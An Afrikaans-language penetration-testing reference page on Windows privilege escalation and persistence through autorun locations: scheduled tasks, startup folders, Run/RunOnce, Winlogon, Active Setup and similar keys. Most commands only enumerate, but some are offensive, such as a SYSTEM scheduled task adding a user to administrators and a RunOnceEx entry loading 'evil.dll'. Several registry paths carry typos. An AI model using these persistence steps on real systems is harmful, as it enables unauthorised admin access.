# Privilege Escalation with Autoruns

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **meld aan** by **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit vandag by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) en begin verdien bounties tot **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## WMIC

**Wmic** kan gebruik word om programme by **opstart** te loop. Sien watter binaries geprogrammeer is om by opstart te loop met:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Geskeduleerde Take

**Take** kan geskeduleer word om met **sekere frekwensie** te loop. Sien watter binaire geskeduleer is om te loop met:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Gids

Alle die binaries wat in die **Startup-gidse geleë is, gaan by opstart uitgevoer word**. Die algemene opstartgidse is diegene wat hieronder gelys is, maar die opstartgids word in die registrasie aangedui. [Read this to learn where.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Registrasie

> [!NOTE]
> [Nota hier](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Die **Wow6432Node** registrasie-invoer dui aan dat jy 'n 64-bis Windows weergawe gebruik. Die bedryfstelsel gebruik hierdie sleutel om 'n aparte weergawe van HKEY_LOCAL_MACHINE\SOFTWARE vir 32-bis toepassings wat op 64-bis Windows weergawes loop, te vertoon.

### Loop

**Algemeen bekend** AutoRun registrasie:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registrasie sleutels bekend as **Run** en **RunOnce** is ontwerp om programme outomaties uit te voer elke keer wanneer 'n gebruiker in die stelsel aanmeld. Die opdraglyn wat aan 'n sleutel se datavalue toegeken word, is beperk tot 260 karakters of minder.

**Diens loop** (kan outomatiese opstart van dienste tydens opstart beheer):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Op Windows Vista en later weergawes, word die **Run** en **RunOnce** registrasie sleutels nie outomaties gegenereer nie. Invoere in hierdie sleutels kan of direkte programme begin of hulle as afhanklikhede spesifiseer. Byvoorbeeld, om 'n DLL-lêer by aanmelding te laai, kan 'n mens die **RunOnceEx** registrasie sleutel saam met 'n "Depend" sleutel gebruik. Dit word demonstreer deur 'n registrasie-invoer by te voeg om "C:\temp\evil.dll" tydens die stelsels opstart uit te voer:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!NOTE]
> **Eksploitasie 1**: As jy binne enige van die genoemde register in **HKLM** kan skryf, kan jy voorregte verhoog wanneer 'n ander gebruiker aanmeld.

> [!NOTE]
> **Eksploitasie 2**: As jy enige van die binêre wat op enige van die register in **HKLM** aangedui is, kan oorskryf, kan jy daardie binêre met 'n agterdeur wysig wanneer 'n ander gebruiker aanmeld en voorregte verhoog.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Kortpaaie wat in die **Startup**-map geplaas word, sal outomaties dienste of toepassings aktiveer om te begin tydens gebruikersaanmelding of stelselhervatting. Die ligging van die **Startup**-map is in die register gedefinieer vir beide die **Local Machine** en **Current User** skope. Dit beteken dat enige kortpad wat by hierdie gespesifiseerde **Startup**-liggings gevoeg word, sal verseker dat die gekoppelde diens of program begin na die aanmeld- of herlaai-proses, wat dit 'n eenvoudige metode maak om programme outomaties te skeduleer.

> [!NOTE]
> As jy enige \[User] Shell Folder onder **HKLM** kan oorskryf, sal jy in staat wees om dit na 'n gids wat deur jou beheer word, te wys en 'n backdoor te plaas wat uitgevoer sal word wanneer 'n gebruiker in die stelsel aanmeld, wat privaathede sal verhoog.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon Sleutels

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Tipies is die **Userinit** sleutel op **userinit.exe** gestel. As hierdie sleutel egter gewysig word, sal die gespesifiseerde uitvoerbare lêer ook deur **Winlogon** begin word wanneer die gebruiker aanmeld. Op soortgelyke wyse is die **Shell** sleutel bedoel om na **explorer.exe** te verwys, wat die standaard skulp vir Windows is.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!NOTE]
> As jy die registriewaarde of die binêre kan oorskryf, sal jy in staat wees om voorregte te verhoog.

### Beleid Instellings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Kontroleer **Run** sleutel.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Verandering van die Veilige Modus Opdragprompt

In die Windows Register onder `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, is daar 'n **`AlternateShell`** waarde wat standaard op `cmd.exe` gestel is. Dit beteken wanneer jy "Veilige Modus met Opdragprompt" tydens opstart (deur F8 te druk) kies, word `cmd.exe` gebruik. Maar, dit is moontlik om jou rekenaar op te stel om outomaties in hierdie modus te begin sonder om F8 te druk en dit handmatig te kies.

Stappe om 'n opstartopsie te skep vir outomatiese begin in "Veilige Modus met Opdragprompt":

1. Verander eienskappe van die `boot.ini` lêer om lees-slegs, stelsel, en verborge vlae te verwyder: `attrib c:\boot.ini -r -s -h`
2. Maak `boot.ini` oop vir redigering.
3. Voeg 'n lyn in soos: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Stoor veranderinge aan `boot.ini`.
5. Herstel die oorspronklike lêereienskap: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Die verandering van die **AlternateShell** register sleutel laat 'n pasgemaakte opdragskil opstelling toe, moontlik vir ongeoorloofde toegang.
- **Exploit 2 (PATH Skryf Toestemmings):** Om skryftoestemmings te hê na enige deel van die stelsel **PATH** veranderlike, veral voor `C:\Windows\system32`, laat jou toe om 'n pasgemaakte `cmd.exe` uit te voer, wat 'n agterdeur kan wees as die stelsel in Veilige Modus begin.
- **Exploit 3 (PATH en boot.ini Skryf Toestemmings):** Skryf toegang tot `boot.ini` stel outomatiese Veilige Modus opstart in staat, wat ongeoorloofde toegang op die volgende herbegin vergemaklik.

Om die huidige **AlternateShell** instelling te kontroleer, gebruik hierdie opdragte:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Gemonteerde Komponent

Active Setup is 'n kenmerk in Windows wat **begin voordat die desktopomgewing ten volle gelaai is**. Dit prioritiseer die uitvoering van sekere opdragte, wat moet voltooi voordat die gebruiker se aanmelding voortgaan. Hierdie proses vind plaas selfs voordat ander opstartinvoere, soos dié in die Run of RunOnce registrieseksies, geaktiveer word.

Active Setup word bestuur deur die volgende registriesleutels:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Binne hierdie sleutels bestaan verskeie subsleutels, elk wat ooreenstem met 'n spesifieke komponent. Sleutelwaardes van besondere belang sluit in:

- **IsInstalled:**
- `0` dui aan dat die komponent se opdrag nie sal uitvoer nie.
- `1` beteken die opdrag sal een keer vir elke gebruiker uitvoer, wat die standaardgedrag is as die `IsInstalled` waarde ontbreek.
- **StubPath:** Definieer die opdrag wat deur Active Setup uitgevoer moet word. Dit kan enige geldige opdraglyn wees, soos om `notepad` te begin.

**Sekuriteitsinsigte:**

- Om 'n sleutel te wysig of na 'n sleutel te skryf waar **`IsInstalled`** op `"1"` gestel is met 'n spesifieke **`StubPath`** kan lei tot ongeoorloofde opdraguitvoering, moontlik vir privilige-escalasie.
- Om die binêre lêer wat in enige **`StubPath`** waarde verwys, te verander kan ook privilige-escalasie bereik, gegewe voldoende regte.

Om die **`StubPath`** konfigurasies oor Active Setup komponente te ondersoek, kan hierdie opdragte gebruik word:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Blaaier Helper Objekte

### Oorsig van Blaaier Helper Objekte (BHOs)

Blaaier Helper Objekte (BHOs) is DLL-modules wat ekstra funksies by Microsoft se Internet Explorer voeg. Hulle laai in Internet Explorer en Windows Explorer by elke begin. Tog kan hul uitvoering geblokkeer word deur die **NoExplorer** sleutel op 1 te stel, wat voorkom dat hulle saam met Windows Explorer instansies laai.

BHOs is versoenbaar met Windows 10 via Internet Explorer 11, maar word nie ondersteun in Microsoft Edge, die standaardblaaier in nuwer weergawes van Windows nie.

Om BHOs wat op 'n stelsel geregistreer is te verken, kan jy die volgende registrasiesleutels inspekteer:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Elke BHO word verteenwoordig deur sy **CLSID** in die registrasie, wat as 'n unieke identifiseerder dien. Gedetailleerde inligting oor elke CLSID kan gevind word onder `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Vir die opvra van BHOs in die registrasie, kan hierdie opdragte gebruik word:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Uitbreidings

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Let daarop dat die registrasie 1 nuwe registrasie per elke dll sal bevat en dit sal verteenwoordig word deur die **CLSID**. Jy kan die CLSID-inligting vind in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Lettertipe bestuurders

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open Command

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Beeldlêer Uitvoeringsopsies
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Let daarop dat al die webwerwe waar jy autoruns kan vind **reeds deur**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) gesoek is. egter, vir 'n **meer omvattende lys van outomaties uitgevoerde** lêers kan jy [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) van sysinternals gebruik:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Meer

**Vind meer Autoruns soos registries in** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## Verwysings

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty wenk**: **meld aan** by **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit vandag by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) en begin om bounties tot **$100,000** te verdien!

{% embed url="https://go.intigriti.com/hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
